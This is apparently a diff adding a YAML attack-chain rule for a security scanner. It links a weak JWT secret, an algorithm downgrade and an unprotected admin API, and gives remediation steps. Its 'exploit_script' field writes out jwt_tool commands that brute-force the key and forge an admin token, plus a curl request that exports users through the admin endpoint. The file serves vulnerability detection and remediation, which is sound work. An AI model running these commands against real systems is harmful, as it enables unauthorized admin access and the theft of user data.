@@ -1,0 +1,44 @@
+id: CHAIN-001
+name: "JWT弱密钥 → 管理员伪造 → 数据导出"
+severity: CRITICAL
+cvss: 9.8
+epss: 0.85
+
+steps:
+  - step: 1
+    name: "JWT密钥强度检测"
+    rule: jwt_weak_secret
+    description: "JWT使用弱密钥或可预测的密钥"
+    condition: "密钥长度 < 32 bytes 或在常见字典中"
+
+  - step: 2
+    name: "算法降级检测"
+    rule: jwt_alg_none
+    description: "JWT允许none算法或算法可切换"
+    condition: "alg 为 'none' 或可篡改"
+
+  - step: 3
+    name: "管理员接口暴露"
+    rule: admin_api_exposed
+    description: "管理员API端点无额外认证"
+    condition: "/api/admin/* 无二次验证"
+
+exploit_script: |
+  # Step 1: 爆破弱密钥
+  jwt_tool.py -t https://target.com/api/user -k wordlist.txt
+
+  # Step 2: 伪造管理员token
+  jwt_tool.py -T -p found_key -S hs256 \
+    -pc role -pv admin -pc sub -pv 1
+
+  # Step 3: 访问管理员接口
+  curl -H "Authorization: Bearer <forged_token>" \
+    https://target.com/api/admin/users/export
+
+remediation:
+  priority: P0
+  effort: "2小时"
+  suggestions:
+    - "使用 >= 256 bit 的随机密钥"
+    - "强制 algorithms=['HS256'] 白名单"
+    - "管理员接口添加二次认证(MFA)"
